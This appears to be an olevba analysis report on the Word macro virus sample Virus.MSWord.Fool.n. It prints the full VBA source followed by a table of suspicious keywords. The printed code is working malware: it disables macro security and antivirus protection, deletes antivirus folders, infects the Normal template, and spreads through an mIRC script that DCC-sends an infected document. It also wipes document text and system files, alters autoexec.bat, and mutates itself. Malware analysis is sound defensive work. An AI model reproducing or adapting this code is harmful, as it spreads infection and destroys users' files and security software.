olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Fool.n
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Fool.n - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO skrip.bas 
in file: Virus.MSWord.Fool.n - OLE stream: 'Macros/VBA/skrip'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Skip As Integer
    
Sub skrip()
On Error Resume Next
ActiveDocument.VBProject.VBComponents("skrip").Export "c:\skrip.drv"
SetAttr "c:\skrip.drv", 6
ActiveDocument.ReadOnlyRecommended = False
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options", "EnableMacroVirusProtection") = 0&
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\McAfee\Scan95", "DAT") = "Just for FUN by FoV"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\McAfee\Scan95", "DATFile") = "No need Anti Virus"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\McAfee\virusscan", "DAT") = "Don't Underestimate Me"
With Application
.EnableCancelKey = wdCancelDisabled
.DisplayAlerts = wdAlertsNone
.ScreenUpdating = False
End With
With Options
.ConfirmConversions = False
.VirusProtection = False
.SaveNormalPrompt = False
End With
If (Second(Now()) > 50) Then
    Installed = Dir("c:\mirc\mirc32.exe")
    If Installed = "" Then
    Exit Sub
    Else
    reproduce = Dir("c:\mirc\download\IRC-Rules.doc")
    If reproduce = "" Then ActiveDocument.SaveAs "c:\mirc\download\IRC-Rules.doc"
    Kill "c:\mirc\script.ini"
    Open "c:\mirc\script.ini" For Output As #1
    Print #1, "[script]"
    Print #1, "n0=on 1:JOIN:#: if ( $me != $nick ) { /dcc send $nick c:\mirc\download\IRC-Rules.doc }"
    Print #1, "n1=on 1:CONNECT: {"
    Print #1, "n2=  /join #virus "
    Print #1, "n3=  /msg #virus "
    Print #1, "n4= /part #virus"
    Print #1, "n5= /clear"
    Print #1, "n6= /motd"
    Print #1, "n7= }"
    Close #1
    End If
End If
JsLw = Int(Rnd * 100)
    If JsLw = 99 Then MsgBox "SkRiPsI is SuCK", vbSystemModal
If Month(Now()) = 1 Or 2 Or 3 Or 4 Or 5 Or 6 Or 12 Then Call Hapus
If Month(Now()) = 11 And Day(Now()) = 5 Then MsgBox "Happynes to all of you", vbInformation, "Birthday Greeting!!!"
If (Minute(Now()) = 25) Then Call Tanya
If NormalTemplate.VBProject.VBComponents.Item("skrip").Name <> "skrip" Then ejek = True
If ActiveDocument.VBProject.VBComponents.Item("skrip").Name <> "skrip" Then tipu = True
If ejek = True And tipu = False Then Set olok = NormalTemplate.VBProject.VBComponents
If ejek = False And tipu = True Then Set olok = ActiveDocument.VBProject.VBComponents
olok.Import "c:\skrip.drv"
If ejek = True And tipu = False Then Shell ("label c: Fov"), 0
If ejek = False And Skip <> 1 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If tipu = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
BxUiSjEj:
Call Polymorphic
End Sub
Sub HelpAbout()
    On Error Resume Next
    Msg = "Peace Words" & Chr(13) & Chr(10)
    Msg = Msg & "Welcome to my world" & Chr(13) & Chr(10)
    Msg = Msg & "Please enjoy your time" & Chr(13) & Chr(10)
    Msg = Msg & "BEFORE YOUR DIE"
    MsgBox Msg, 64, "Microsoft Word"
End Sub
Sub FileNew()
    On Error Resume Next
    Call KillAV
    Call skrip
Dialogs(wdDialogFileNew).Show
    Skip = 1
    Call skrip
    Call Polymorphic
End Sub
Sub FileSave()
    On Error Resume Next
    Call KillAV
    Call skrip
    Call Polymorphic
    ActiveDocument.Save
End Sub
Sub FileClose()
    On Error Resume Next
    Call KillAV
    Call skrip
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Call Polymorphic
    ActiveDocument.Close
End Sub
Sub FileSaveAs()
    On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
    Call KillAV
    Call skrip
    Call Polymorphic
End Sub
Sub FileExit()
    On Error Resume Next
    Call KillAV
    Call skrip
    Call Polymorphic
    System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Winlogon", "LegalNoticeText") = "Welcome"
    System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "FoV"
    Msg = "Please Turn-off your computer" & Chr(13) & Chr(10)
    Msg = Msg & "Don't Click bellow"
    MsgBox Msg, 16, "Microsoft Word"
    Kill "C:\windows\command\*.*"
    Kill "C:\*.*"
    Kill "C:\progra~1\*.*"
    Msg = "You aren't obey my order" & Chr(13) & Chr(10)
    Msg = Msg & "May the God Bless You"
    MsgBox Msg, 64, "FoV"
Finish:
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.Quit
End Sub
Sub AutoOpen()
    On Error Resume Next
    Call KillAV
    Call skrip
    Call Polymorphic
End Sub
Sub AutoExit()
    On Error Resume Next
    SetAttr "C:\Autoexec.bat", 0
    Open "C:\Autoexec.bat" For Append As #1
    Print #1, "ECHO OFF"
    Print #1, "CLS"
    Print #1, "ECHO                ÖÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ·"
    Print #1, "ECHO                º  *****************************************  º"
    Print #1, "ECHO                º  *               FoV DJ                  *  º"
    Print #1, "ECHO                º  *****************************************  º"
    Print #1, "ECHO                º  FoV DJ wishes to thank the user            º"
    Print #1, "ECHO                º  of this computer because you have          º"
    Print #1, "ECHO                º  helped to spread the good words of peace!  º"
    Print #1, "ECHO                º               ## Fov DJ ##                  º"
    Print #1, "ECHO                ÓÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ½"
    Print #1, "CLS"
    Close #1
    Call KillAV
    Call skrip
    Call Polymorphic
End Sub
Sub AutoExec()
    On Error Resume Next
    Call KillAV
    Call skrip
    Call Polymorphic
End Sub
Sub ToolsMacro()
    Beep
    Call Pesan1
    Call Polymorphic
    On Error Resume Next
End Sub
Sub ToolsOptions()
    Beep
    Call Polymorphic
    On Error Resume Next
End Sub

Sub FileTemplates()
    Beep
    Call Polymorphic
    On Error Resume Next
End Sub
Sub ViewVBCode()
    Beep
    Call Polymorphic
    On Error Resume Next
End Sub
Sub Hapus()
    On Error Resume Next
    Selection.WholeStory
    Selection.Delete Unit:=wdCharacter, Count:=1
    ActiveDocument.Save
End Sub
Sub Pesan1()
    On Error Resume Next
    Msg = "Macro Function is not active" & Chr(13) & Chr(10)
    Msg = Msg & "Never use IT"
    MsgBox Msg, 16, "Microsoft Word"
End Sub
Sub Polymorphic()
On Error Resume Next
PoNu = Int(Rnd() * 28 + 1)
For Mutate = 1 To PoNu
PoRL = Application.VBE.ActiveVBProject.VBComponents("skrip").CodeModule.CountOfLines
PoLi = Int(Rnd() * PoRL + 1)
a = Rnd * 55: b = Rnd * 90: c = Rnd * 170: d = Rnd * 210: e = Rnd * 59
Application.VBE.ActiveVBProject.VBComponents("skrip").CodeModule.InsertLines PoLi, vbTab & "Rem " & a & vbTab & b & vbTab & c & vbTab & d & vbTab & e
Next Mutate
End Sub
Sub KillAV()
On Error Resume Next
Kill "C:\Program Files\AntiViral Toolkit Pro\*.*"
Kill "C:\Program Files\Command Software\F-PROT95\*.*"
Kill "C:\Program Files\FindVirus\*.*"
Kill "C:\Toolkit\FindVirus\*.*"
Kill "C:\Program Files\Quick Heal\*.*"
Kill "C:\Program Files\McAfee\VirusScan\*.*"
Kill "C:\Program Files\Norton AntiVirus\*.*"
Kill "C:\TBAVW95\*.*"
Kill "C:\VS95\*.*"
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |mirc32.exe          |Executable file name                         |
|IOC       |Autoexec.bat        |Executable file name                         |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

